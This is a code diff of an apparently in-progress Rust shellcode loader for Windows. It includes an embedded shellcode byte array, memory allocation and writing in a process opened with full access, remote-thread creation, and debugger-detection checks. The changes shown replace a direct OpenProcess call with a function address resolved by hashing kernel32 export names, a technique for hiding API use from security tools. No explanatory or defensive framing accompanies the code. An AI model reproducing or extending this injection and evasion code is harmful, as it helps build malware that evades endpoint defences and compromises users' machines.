@@ -7,33 +7,33 @@
 use windows::{
     Win32::{
         System::{
-            Memory::{VirtualAllocEx, VirtualProtectEx, VirtualFree, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, VIRTUAL_ALLOCATION_TYPE},
+            Memory::{VirtualAllocEx, VirtualProtectEx, VirtualFree, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, VIRTUAL_ALLOCATION_TYPE, VIRTUAL_FREE_TYPE},
             Diagnostics::Debug::{WriteProcessMemory, IsDebuggerPresent, CheckRemoteDebuggerPresent, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64, IMAGE_DIRECTORY_ENTRY_EXPORT}, 
             Threading::{CreateRemoteThreadEx, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS, INFINITE, PROCESS_ACCESS_RIGHTS, LPPROC_THREAD_ATTRIBUTE_LIST, LPTHREAD_START_ROUTINE},
             LibraryLoader::LoadLibraryA,
             SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY},
         },
-        Foundation::{CloseHandle, BOOL, HMODULE, HANDLE},
+        Foundation::{CloseHandle, BOOL, HMODULE, HANDLE, WAIT_EVENT},
         Security::SECURITY_ATTRIBUTES,
     },
     core::{PCSTR, Result},
 };
 use std::{ptr::{self, null_mut, null}, process, mem, str, slice, os::raw::c_void, option::Option};
 
-type XOpenProcess = unsafe extern "system" fn(
+type TOpenProcess = unsafe extern "system" fn(
     dwdesiredaccess: PROCESS_ACCESS_RIGHTS,
     binherithandle: BOOL,
     dwprocessid: u32
 ) -> Result<HANDLE>;
 
-type XCheckRemoteDebuggerPresent = unsafe extern "system" fn(
+type TCheckRemoteDebuggerPresent = unsafe extern "system" fn(
     hprocess: HANDLE,
     pbdebuggerpresent: *mut BOOL
 ) -> Result<()>;
 
-type XIsDebuggerPresent = unsafe extern "system" fn() -> BOOL;
+type TIsDebuggerPresent = unsafe extern "system" fn() -> BOOL;
 
-type XVirtualAllocEx = unsafe extern "system" fn(
+type TVirtualAllocEx = unsafe extern "system" fn(
     hprocess: HANDLE,
     lpaddress: Option<*const c_void>,
     dwsize: usize,
@@ -41,11 +41,11 @@ type XVirtualAllocEx = unsafe extern "system" fn(
     flprotect: PAGE_PROTECTION_FLAGS
 ) -> *mut c_void;
 
-type XCloseHandle = unsafe extern "system" fn(
+type TCloseHandle = unsafe extern "system" fn(
     hobject: HANDLE
 ) -> Result<()>;
 
-type XWriteProcessMemory = unsafe extern "system" fn(
+type TWriteProcessMemory = unsafe extern "system" fn(
     hprocess: HANDLE,
     lpbaseaddress: *const c_void,
     lpbuffer: *const c_void,
@@ -53,7 +53,7 @@ type XWriteProcessMemory = unsafe extern "system" fn(
     lpnumberofbyteswritten: Option<*mut usize>
 ) -> Result<()>;
 
-type XVirtualProtectEx = unsafe extern "system" fn(
+type TVirtualProtectEx = unsafe extern "system" fn(
     hprocess: HANDLE,
     lpaddress: *const c_void,
     dwsize: usize,
@@ -61,7 +61,7 @@ type XVirtualProtectEx = unsafe extern "system" fn(
     lpfloldprotect: *mut PAGE_PROTECTION_FLAGS
 ) -> Result<()>;
 
-type XCreateRemoteThreadEx = unsafe extern "system" fn(
+type TCreateRemoteThreadEx = unsafe extern "system" fn(
     hprocess: HANDLE,
     lpthreadattributes: Option<*const SECURITY_ATTRIBUTES>,
     dwstacksize: usize,
@@ -72,6 +72,16 @@ type XCreateRemoteThreadEx = unsafe extern "system" fn(
     lpthreadid: Option<*mut u32>
 ) -> Result<HANDLE>;
 
+type TWaitForSingleObject = unsafe extern "system" fn(
+    hhandle: HANDLE,
+    dwmilliseconds: u32
+) -> WAIT_EVENT;
+
+type TVirtualFree = unsafe extern "system" fn(
+    lpaddress: *mut c_void,
+    dwsize: usize,
+    dwfreetype: VIRTUAL_FREE_TYPE
+) -> Result<()>;
    
 fn getHashFromFunc(funcName: &str) -> u32 {
     // let stringLength: usize = funcName.len();
@@ -179,16 +189,24 @@ fn main() {
         0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x28, 0xff, 0xd0,
     ];
 
-    getFuncAddressByHash("kernel32", 0xf92f7b);
+    //getFuncAddressByHash("kernel32", 0xf92f7b);
 
     let pid = process::id();
 
     unsafe {
 
-        println!("[i] Trying to open a Handle for the Process {pid}");
-        match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
-            Ok(hprocess) => 'p: {
+        let func_addr: *const u32 = getFuncAddressByHash("kernel32", 0x9e08d0);
 
+        if func_addr.is_null() {
+            process::exit(-1);
+        }
+        
+        let XOpenProcess: TOpenProcess = mem::transmute(func_addr);
+
+        println!("[i] Trying to open a Handle for the Process {pid}");
+        match XOpenProcess(PROCESS_ALL_ACCESS, false.into(), pid) {
+            Ok(hprocess) => 'p: {
+                println!("Nah");
                 let mut debugger_present: BOOL = BOOL(0);
                 
                 if CheckRemoteDebuggerPresent(hprocess, &mut debugger_present as *mut BOOL).is_ok() && debugger_present.as_bool() {
